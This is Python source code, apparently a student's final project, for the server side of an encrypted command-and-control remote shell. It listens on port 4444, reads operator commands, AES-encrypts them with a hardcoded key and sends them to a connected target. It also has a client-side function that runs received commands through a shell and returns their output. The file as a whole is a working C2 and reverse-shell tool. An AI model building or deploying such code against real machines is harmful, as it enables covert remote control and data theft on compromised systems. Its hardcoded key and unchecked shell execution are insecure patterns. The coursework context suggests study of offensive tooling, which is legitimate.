#/usr/bin/python3
#Huy Le
#OPSC-540-81A
#Week 8: Final Project Code (Server)
#March 5, 2021

#import modules
import socket
import os
import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

#global variables (IP address, Port #, Max message size, SERVER object, encryption key, initialization vector)
#creates a file to store results
IP = '127.0.0.1'
PORT = 4444
MAX_SIZE = 1024
SERVER = ''
AES_KEY = b'testingkey123456'
#IV = '' #for testing
outFile = open('outputs.txt','w')
outFile.close()

##################################################################################################
#server-side functions

def startsocket():
    #creates socket object and binds to IP/port
    global SERVER
    try:
        SERVER = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        SERVER.bind((IP,PORT))
    except:
        print('Error binding port\n')
        sys.exit()

def communication():
    #utilizes socket object to set listener and communicate with target
    #manages communication between devices
    #encryptcommands() function will be used here as well to encrypt commands
    global SERVER
    
    #listens for client connection request
    try:
        print(f'Starting server on port: {PORT}')
        SERVER.listen(5)
        conn, addr = SERVER.accept()
        data = ''
        dataS = ''
    except:
        print('Forced shutdown\n')
        SERVER.close()
        sys.exit()
    
    #Receives data from target server and requests input command from CnC
    #data received and sent is either encrypted or decrypted with AES utilizing encryption key and initialization vector (IV)
    while True:
        try:
            #receives data of size MAX_SIZE, decrypts and displays
            data = conn.recv(MAX_SIZE)
            deData = decryptcommands(data)
            print(deData)
            #CnC command input
            dataS = input('Command: ')
            if ('exit' in dataS):
                print('Exiting Server and Shutting Down\n')
                dataS, initVec = encryptcommands('exit')
                conn.send(dataS+b'+++'+initVec)
                break
            #encrypts input and returns ciphertext with IV
            dataS,initVec = encryptcommands(dataS)
            #sends ciphertext and appends IV with byte string +++ for splitting on server side
            conn.send(dataS+b'+++'+initVec)
        except Exception as e:
            print('Shutting down Server due to error')
            print(e)
            break
    

###############################################################################################
#joined functions

def encryptcommands(command):
    #encrypts commands that will be sent
    #returns encrypted command with IV
    #global IV #for testing
    cipher = AES.new(AES_KEY, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(bytes(command,encoding='utf-8'),AES.block_size))
    IV = cipher.iv
    return ciphertext, IV


def decryptcommands(ciphertext):
    #decrypts commands received and displays
    #utilizes byte string --- to split client string, tempData[0]=ciphertext, tempData[1]=IV
    tempData = ciphertext.split(b'---')
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=tempData[1])
    print('Decrypted Result: ')
    data = unpad(cipher.decrypt(tempData[0]),AES.block_size)
    with open('outputs.txt','a') as outFile:
        outFile.write('\n\n')
        outFile.write(data.decode())
    return (data.decode())


##############################################################################################
#client-side functions

def checksandsetter():
    #when script is started, check device platform
    plat = sys.platform
    print(f'This system is running {plat}\n')

def executecommand(command):
    #proceeds by executing decrypted command
    #returns redirected standard input, output, or error
    cmd=subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    return (cmd.stdout.read().decode() + cmd.stderr.read().decode())


#################################################################################################
#main
if __name__ == '__main__':
    startsocket()
    #checksandsetter()
    communication()
    SERVER.close()
    sys.exit()
